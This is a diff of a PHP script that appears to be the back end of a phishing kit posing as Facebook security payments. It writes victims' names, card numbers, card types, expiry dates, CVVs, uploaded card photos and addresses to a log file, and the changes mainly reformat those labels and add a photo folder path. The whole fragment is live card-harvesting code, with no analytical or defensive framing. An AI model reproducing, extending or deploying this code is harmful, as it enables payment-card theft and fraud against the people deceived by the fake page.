@@ -37,33 +37,29 @@ $alamat = $_SERVER['REMOTE_ADDR'];
 $handle = fopen($file, 'a');
 fwrite($handle, "----FACEBOOK-SECURITY-PAYMENTS-BY-MOKONDO----");
 fwrite($handle, "\n");
-fwrite($handle, "Nama		: ");
+fwrite($handle, "Nama   : ");
 fwrite($handle, "$nd");
 fwrite($handle, " ");
 fwrite($handle, "$nb");
 fwrite($handle, "\n");
-fwrite($handle, "No Kartu	: ");
+fwrite($handle, "No Kartu: ");
 fwrite($handle, "$cn");
 fwrite($handle, "\n");
-fwrite($handle, "Jenis CC	: ");
+fwrite($handle, "Credit : ");
 fwrite($handle, "$ct");
 fwrite($handle, "\n");
-fwrite($handle, "Exp Date	: ");
+fwrite($handle, "Exp    : ");
 fwrite($handle, "$mm");
 fwrite($handle, "/");
 fwrite($handle, "$yy");
 fwrite($handle, " CVV : ");
 fwrite($handle, "$cv");
-
 fwrite($handle, "\n");
 fwrite($handle, "Card 1   : ");
-fwrite($handle, "$file_name");
-
+fwrite($handle, "/fotocc/$file_name");
 fwrite($handle, "\n");
 fwrite($handle, "Card 2   : ");
-fwrite($handle, "$file_name1");
-
-
+fwrite($handle, "/fotocc/$file_name1");
 fwrite($handle, "\n");
 fwrite($handle, "Alamat   : ");
 fwrite($handle, "$a1");
@@ -71,7 +67,6 @@ fwrite($handle, "\n");
 fwrite($handle, "Alamat   : ");
 fwrite($handle, "$a2");
 fwrite($handle, "\n");
-
 fwrite($handle, "City     : ");
 fwrite($handle, "$cty");
 fwrite($handle, "\n");
